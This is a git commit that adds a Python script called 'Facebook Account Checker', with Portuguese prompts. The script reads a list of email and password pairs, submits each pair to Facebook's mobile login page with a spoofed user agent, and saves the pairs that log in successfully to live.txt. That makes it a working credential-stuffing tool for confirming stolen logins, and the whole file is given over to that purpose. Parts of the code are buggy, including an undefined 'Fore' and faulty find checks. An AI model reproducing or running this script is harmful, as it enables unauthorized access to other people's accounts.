90b7acf8a53e656804365e428fc5cd4d0eac327a
Angeel <35373572+goodhackerboy@users.noreply.github.com>
2018-03-21 19:29:08 -0300

    Facebook Account Checker
    don't use threading

---
+++ facebook.py
@@ -0,0 +1,42 @@
+import json
+import requests
+import os
+import random
+import colorama
+from colorama import init
+init()
+from colorama import Fore as F
+
+cores = random.choice([Fore.WHITE, Fore.GREEN, Fore.RED, Fore.BLUE, Fore.BLACK, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA])
+lista = input("Lista que deseja usar: ")
+separa = input("Separador: ")
+os.system('clear')
+os.system('cls')
+print(cores + """
+	Facebook Account Checker
+	Made by Angeel
+	Twitter > @anxelofsk8
+	""")
+
+lista = open(lista, 'r').readlines()
+lista = [linha.replace('\n',"") for linha in lista]
+for linha in lista:
+	dados = linha.split(separa)
+	url = 'https://mobile.facebook.com/login'
+	headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B'}
+	payload = {'email': dados[0], 'pass': dados[1]}
+	r = requests.post(url, headers=headers, data=payload).text
+	if r.find("<title>Entrar no Facebook | Facebook</title>") == -1:
+		print(F.GREEN + "[+] Live ~> {}|{}".format(dados[0],dados[1] + " [+]"))
+		print("-- Live accounts --\n" + dados[0] + "|" + dados[1], file=open("live.txt", "a+"))
+
+	elif r.find('Você usou uma senha antiga. Se você esqueceu sua senha atual, você pode solicitar'):
+		print(F.YELLOW + '[!] Senha Antiga [!]')
+
+	elif r.find('Você alterou sua senha a mais de '):
+		print(F.YELLOW + '[!] Senha Antiga [!]')
+
+
+	else:
+		print(F.RED + "[-] Die --> {}|{}".format(dados[0],dados[1] + " [-]"))
+
